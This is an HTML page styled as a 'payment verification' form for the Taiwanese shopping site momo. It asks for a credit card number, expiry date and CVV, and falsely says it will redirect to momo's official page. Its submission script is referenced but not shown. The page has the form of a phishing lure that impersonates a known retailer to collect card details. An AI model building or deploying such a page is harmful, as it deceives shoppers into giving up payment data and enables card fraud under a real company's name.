<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>momo購物網 - 補繳款項</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="login-container">
  <h1 class="title">付款驗證</h1>

  <form id="paymentForm">
    <div class="form-group">
      <label for="cardNumber">信用卡卡號</label>
      <input type="text" id="cardNumber" placeholder="請輸入信用卡卡號" required>
    </div>

    <div class="form-group">
      <label for="expiry">有效期限</label>
      <input type="text" id="expiry" placeholder="MM/YY" required>
    </div>

    <div class="form-group">
      <label for="cvv">安全碼</label>
      <input type="password" id="cvv" placeholder="CVV" required>
    </div>

    <p class="error" id="paymentError"></p>

    <button type="submit" class="login-btn">確認付款</button>

    <p class="notice">系統將自動導向 momo 官方頁面以完成驗證...</p>
  </form>
</div>

<script src="payment.js"></script>
</body>
</html>
